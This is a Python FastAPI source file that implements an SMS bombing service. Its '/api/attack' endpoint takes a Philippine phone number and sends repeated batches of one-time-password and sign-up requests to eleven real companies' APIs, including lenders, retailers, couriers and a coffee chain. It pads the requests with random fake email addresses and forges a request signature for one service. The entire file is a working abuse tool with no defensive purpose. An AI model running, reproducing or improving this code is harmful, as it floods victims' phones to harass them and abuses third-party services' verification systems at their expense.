from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
import asyncio
import random
import string
import hashlib
import time
import uuid
import re
from datetime import datetime

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

class AttackRequest(BaseModel):
    phone: str
    batches: int

def format_phone(phone):
    phone = str(phone).strip().replace(' ', '').replace('-', '').replace('+', '')
    if phone.startswith('0'): phone = phone[1:]
    elif phone.startswith('63'): phone = phone[2:]
    return phone

def validate_phone(phone):
    return bool(re.match(r'^9\d{9}$', format_phone(phone)))

def random_string(length):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def random_gmail():
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(8, 12))) + "@gmail.com"

def generate_kumu_signature(timestamp, random_str, phone_number):
    data = f"{timestamp}{random_str}{phone_number}kumu_secret_2024"
    return hashlib.sha256(data.encode()).hexdigest()

# --- ASYNC SERVICE WORKERS ---
async def send_ezloan(client, phone):
    try:
        data = {"businessId": "EZLOAN", "contactNumber": f"+63{format_phone(phone)}"}
        r = await client.post('https://gateway.ezloancash.ph/security/auth/otp/request', json=data)
        return {"service": "EZLOAN", "success": r.status_code == 200 and r.json().get('code') == 0}
    except: return {"service": "EZLOAN", "success": False}

async def send_xpress(client, phone, idx):
    try:
        data = {"FirstName": f"U{idx}", "Email": random_gmail(), "Phone": f"+63{format_phone(phone)}", "Password": "P123!", "ConfirmPassword": "P123!"}
        r = await client.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", json=data)
        return {"service": "XPRESS", "success": r.status_code == 200}
    except: return {"service": "XPRESS", "success": False}

async def send_abenson(client, phone):
    try:
        data = f'contact_no={phone}&login_token=undefined'
        r = await client.post('https://api.mobile.abenson.com/api/public/membership/activate_otp', content=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        return {"service": "ABENSON", "success": r.status_code == 200}
    except: return {"service": "ABENSON", "success": False}

async def send_excellent(client, phone):
    try:
        data = {"domain": phone, "cat": "login", "previous": False, "financial": random_string(32)}
        r = await client.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', json=data)
        return {"service": "EXCELLENT", "success": r.status_code == 200}
    except: return {"service": "EXCELLENT", "success": False}

async def send_bistro(client, phone):
    try:
        headers = {'x-requested-with': 'com.allcardtech.bistro'}
        r = await client.get(f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{format_phone(phone)}', headers=headers)
        return {"service": "BISTRO", "success": r.status_code == 200}
    except: return {"service": "BISTRO", "success": False}

async def send_bayad(client, phone):
    try:
        data = {"mobileNumber": f"+63{format_phone(phone)}", "emailAddress": random_gmail()}
        r = await client.post("https://api.online.bayad.com/api/sign-up/otp", json=data)
        return {"service": "BAYAD", "success": r.status_code == 200}
    except: return {"service": "BAYAD", "success": False}

async def send_lbc(client, phone):
    try:
        data = {'verification_type': 'mobile', 'client_email': random_gmail(), 'client_contact_code': '+63', 'client_contact_no': format_phone(phone)}
        r = await client.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', data=data)
        return {"service": "LBC", "success": r.status_code == 200}
    except: return {"service": "LBC", "success": False}

async def send_pickup(client, phone):
    try:
        data = {"mobile_number": f"+63{format_phone(phone)}", "login_method": 'mobile_number'}
        r = await client.post('https://production.api.pickup-coffee.net/v2/customers/login', json=data)
        return {"service": "PICKUP", "success": r.status_code == 200}
    except: return {"service": "PICKUP", "success": False}

async def send_honey(client, phone):
    try:
        data = {"phone": phone, "is_rights_block_accepted": 1}
        r = await client.post('https://api.honeyloan.ph/api/client/registration/step-one', json=data)
        return {"service": "HONEY", "success": r.status_code == 200}
    except: return {"service": "HONEY", "success": False}

async def send_kumu(client, phone):
    try:
        ts = int(time.time())
        rnd = random_string(32)
        sig = generate_kumu_signature(ts, rnd, format_phone(phone))
        data = {"country_code": "+63", "encrypt_rnd_string": rnd, "cellphone": format_phone(phone), "encrypt_signature": sig, "encrypt_timestamp": ts}
        r = await client.post('https://api.kumuapi.com/v2/user/sendverifysms', json=data)
        return {"service": "KUMU", "success": r.status_code == 200}
    except: return {"service": "KUMU", "success": False}

async def send_s5(client, phone):
    try:
        r = await client.post('https://api.s5.com/player/api/v1/otp/request', json={"phone_number": f"+63{format_phone(phone)}"})
        return {"service": "S5.COM", "success": r.status_code == 200}
    except: return {"service": "S5.COM", "success": False}

@app.post("/api/attack")
async def run_attack(req: AttackRequest):
    if not validate_phone(req.phone):
        raise HTTPException(status_code=400, detail="Invalid PH number. Use 09XXXXXXXXX or 9XXXXXXXXX.")

    batches = min(req.batches, 5) # Limit batches to prevent Vercel timeout
    results = []
    success_count = 0

    # Use httpx AsyncClient for rapid parallel firing
    async with httpx.AsyncClient(timeout=8.0) as client:
        for b in range(batches):
            tasks = [
                send_ezloan(client, req.phone),
                send_xpress(client, req.phone, b),
                send_abenson(client, req.phone),
                send_excellent(client, req.phone),
                send_bistro(client, req.phone),
                send_bayad(client, req.phone),
                send_lbc(client, req.phone),
                send_pickup(client, req.phone),
                send_honey(client, req.phone),
                send_kumu(client, req.phone),
                send_s5(client, req.phone)
            ]
            
            batch_results = await asyncio.gather(*tasks)
            for res in batch_results:
                results.append({
                    "service": res["service"],
                    "success": res["success"],
                    "batch": b + 1,
                    "timestamp": datetime.now().strftime("%H:%M:%S")
                })
                if res["success"]:
                    success_count += 1
            
            # Small delay between batches
            if b < batches - 1:
                await asyncio.sleep(1.5)

    return {
        "total": len(results),
        "success": success_count,
        "fail": len(results) - success_count,
        "logs": results
    }
